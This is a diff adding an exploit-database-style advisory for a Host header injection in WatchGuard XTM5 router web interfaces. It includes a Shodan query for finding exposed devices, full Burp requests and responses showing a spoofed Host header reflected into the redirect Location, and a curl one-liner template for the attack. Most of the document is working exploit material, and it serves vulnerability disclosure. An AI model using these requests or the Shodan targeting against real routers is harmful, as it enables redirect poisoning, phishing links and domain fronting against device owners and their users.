@@ -1,0 +1,92 @@
+# Exploit Title: Watchgaurd HTTP Host Header Injection.
+# Shodan Query: Server: cherryPy/3.6.0
+# Discovered Date: 25/09/2020
+# Exploit Author: Ramikan
+# Vendor Homepage: https://www.watchgaurd.com
+# Affected :XTM5 series
+# Vendor Fix: Update to latest Version
+# CVE : 
+# CVSS v3.1: 8.6 ( AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N)
+# Category: Hardware, Web Apps
+# Reference : www.fact-in-hack.blogspot.com
+
+******************************************************************************************************
+Vulnerability: Host Header Injection
+******************************************************************************************************
+
+A Host Header Injection vulnerability may allow an attacker to spoof a particular Host header, allowing the attacker to render arbitrary links that point to a malicious website with poisoned Host header webpages.
+
+An issue was discovered in Watchgaurd router XTM5 (may be affected on other versions too). The values of the 'Host' headers are implicitly set as trusted while this should be forbidden, leading to potential host header injection attack and also the affected hosts can be used for domain fronting. This means affected hosts can be used by attackers to hide behind during various other attacks.
+
+
+
+******************************************************************************************************
+Request:
+
+GET / HTTP/1.1
+Host: 192.168.10.1:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session_id=0b9d2349ebd734302d1b7f528b63a4adb00adce6
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 303 See Other
+X-Frame-Options: SAMEORIGIN
+Content-Length: 142
+Expires: Sun, 28 Jan 2007 00:00:00 GMT
+Vary: Accept-Encoding
+Server: CherryPy/3.6.0
+Location: https://192.168.10.1:8080/auth/login?from_page=/
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Date: Thu, 24 Sep 2020 09:57:59 GMT
+Content-Type: text/html;charset=utf-8
+Set-Cookie: session_id=0b9d2349ebd734302d1b7f528b63a4adb00adce6; expires=Thu, 24 Sep 2020 10:57:59 GMT; httponly; Path=/; secure
+Connection: close
+
+This resource can be found at <a href="https://192.168.10.1:8080/auth/login?from_page=/">https://192.168.10.1:8080/auth/login?from_page=/</a>.
+
+*****************************************************************************************************************************
+POC 1: Burp request and response
+*****************************************************************************************************************************
+
+Request:
+
+GET /a HTTP/1.1
+Host: google.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session_id=0b9d2349ebd734302d1b7f528b63a4adb00adce6
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 303 See Other
+X-Frame-Options: SAMEORIGIN
+Content-Length: 128
+Expires: Sun, 28 Jan 2007 00:00:00 GMT
+Vary: Accept-Encoding
+Server: CherryPy/3.6.0
+Location: https://google.com/auth/login?from_page=/
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Date: Thu, 24 Sep 2020 10:05:16 GMT
+Content-Type: text/html;charset=utf-8
+Set-Cookie: session_id=0b9d2349ebd734302d1b7f528b63a4adb00adce6; expires=Thu, 24 Sep 2020 11:05:16 GMT; httponly; Path=/; secure
+Connection: close
+
+This resource can be found at <a href="https://google.com/">https://google.com/</a>.
+
+
+POC 2: Using Curl
+
+curl -k --header "Host: attacker domain" "victim's url"
